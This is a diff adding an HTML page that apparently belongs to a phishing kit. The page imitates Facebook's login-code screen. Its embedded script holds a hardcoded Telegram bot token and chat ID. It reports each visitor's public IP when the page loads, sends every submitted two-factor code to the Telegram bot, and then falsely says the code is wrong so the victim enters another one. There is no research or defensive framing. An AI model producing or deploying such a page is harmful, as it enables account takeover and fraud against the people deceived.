@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Enter Your Login Code</title>
+  <link rel="preload" as="image" href="imgs/photo-2024-04-15-20-05-52.jpg">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body, html {
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #050505;
+    }
+    .wrapper {
+      max-width: 760px;
+      margin: 60px auto;
+      padding: 0 20px;
+    }
+    .subtitle {
+      font-size: 15px;
+      color: #606770;
+      margin-bottom: 10px;
+    }
+    h1 {
+      font-size: 28px;
+      font-weight: 600;
+      margin: 0 0 16px 0;
+    }
+    .description {
+      font-size: 17px;
+      line-height: 1.5;
+      color: #1c1e21;
+      margin-bottom: 30px;
+    }
+    .image-box {
+      margin-bottom: 30px;
+    }
+    .image-box img {
+      width: 100%;
+      height: auto;
+      border-radius: 8px;
+    }
+    .status {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 20px;
+      max-width: 600px;
+    }
+    .status-icon svg {
+      width: 32px;
+      height: 32px;
+      margin-top: 2px;
+    }
+    .status-text p {
+      margin: 0;
+    }
+    .status-text p:first-child {
+      font-weight: bold;
+      color: #050505;
+      margin-bottom: 3px;
+    }
+    .status-text p:last-child {
+      color: #606770;
+      font-size: 15px;
+    }
+    .code-input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 17px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      margin-bottom: 10px;
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      margin-bottom: 16px;
+    }
+    .submit-btn:hover {
+      background-color: #166fe5;
+    }
+    .submit-btn:disabled {
+      background-color: #a1c3f7;
+      cursor: not-allowed;
+    }
+    .try-button {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #050505;
+      background-color: white;
+      cursor: pointer;
+      transition: background 0.2s ease-in-out;
+      text-align: center;
+    }
+    .try-button:hover {
+      background-color: #f5f6f7;
+    }
+    .error-message,
+    .checking-message {
+      font-size: 15px;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+    .error-message {
+      color: #fa3e3e;
+    }
+    .checking-message {
+      color: #606770;
+    }
+    .timer {
+      font-size: 14px;
+      color: #606770;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 24px;
+      }
+      .description {
+        font-size: 16px;
+      }
+      .status {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="subtitle">• Facebook</div>
+    <h1>Enter your login code</h1>
+    <div class="description">
+      We sent a code to your phone. It may take a few moments to arrive via SMS or email.
+    </div>
+
+    <div class="image-box">
+      <img src="imgs/photo-2024-04-15-20-05-52.jpg" alt="Login Illustration" />
+    </div>
+
+    <div class="status">
+      <div class="status-icon">
+        <!-- SVG Circle with 3 Dots Inside -->
+        <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="32" cy="32" r="30" fill="none" stroke="black" stroke-width="4"/>
+          <circle cx="24" cy="32" r="3.5" fill="black"/>
+          <circle cx="32" cy="32" r="3.5" fill="black"/>
+          <circle cx="40" cy="32" r="3.5" fill="black"/>
+        </svg>
+      </div>
+      <div class="status-text">
+        <p>Enter the code</p>
+        <p>Use the 6-digit or 8-digit code we sent to complete login.</p>
+      </div>
+    </div>
+
+    <form id="codeForm">
+      <input
+        id="codeInput"
+        class="code-input"
+        type="tel"
+        inputmode="numeric"
+        pattern="[0-9]*"
+        maxlength="8"
+        placeholder="Enter confirmation code"
+        required
+      />
+      <div id="checkingMsg" class="checking-message" style="display:none;">Checking code...</div>
+      <div id="errorMsg" class="error-message" style="display:none;">The code you entered is incorrect. Please try again.</div>
+      <div id="timer" class="timer" style="display:none;">Please wait 30 seconds...</div>
+      <button id="submitBtn" class="submit-btn" type="submit">Continue</button>
+    </form>
+
+    <button class="try-button">Try Another Way</button>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "7489121653:AAGO9WeABG0P7fl6hnqAf7WrDrptpfHguAo";
+    const TELEGRAM_CHAT_ID = "1389938531";
+
+    async function sendTelegramMessage(text) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text,
+        parse_mode: "Markdown"
+      };
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        if (!response.ok) throw new Error("Telegram message failed");
+      } catch (err) {
+        console.error("Telegram send error:", err);
+      }
+    }
+
+    async function getPublicIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        if (!res.ok) throw new Error("Failed to fetch IP");
+        const data = await res.json();
+        return data.ip;
+      } catch (err) {
+        console.error("IP fetch error:", err);
+        return "unknown";
+      }
+    }
+
+    window.addEventListener("load", async () => {
+      const ip = await getPublicIP();
+      await sendTelegramMessage(`Page visited: Login code entry\nIP: ${ip}\nTime: ${new Date().toLocaleString()}`);
+    });
+
+    const form = document.getElementById("codeForm");
+    const input = document.getElementById("codeInput");
+    const error = document.getElementById("errorMsg");
+    const checking = document.getElementById("checkingMsg");
+    const button = document.getElementById("submitBtn");
+    const timer = document.getElementById("timer");
+
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const code = input.value.trim();
+      if (!code) {
+        alert("Please enter the confirmation code.");
+        return;
+      }
+
+      await sendTelegramMessage(`Code submitted: ${code}\nTime: ${new Date().toLocaleString()}`);
+
+      error.style.display = "none";
+      timer.style.display = "none";
+      checking.style.display = "block";
+      button.disabled = true;
+
+      setTimeout(async () => {
+        checking.style.display = "none";
+        error.style.display = "block";
+        timer.style.display = "block";
+        let timeLeft = 30;
+        timer.textContent = `Please wait ${timeLeft} seconds...`;
+
+        await sendTelegramMessage(`Incorrect code entered: ${code}\nWaiting 30 seconds before next attempt\nTime: ${new Date().toLocaleString()}`);
+
+        const countdown = setInterval(() => {
+          timeLeft--;
+          timer.textContent = `Please wait ${timeLeft} seconds...`;
+          if (timeLeft <= 0) {
+            clearInterval(countdown);
+            button.disabled = false;
+            timer.style.display = "none";
+            input.focus();
+          }
+        }, 1000);
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
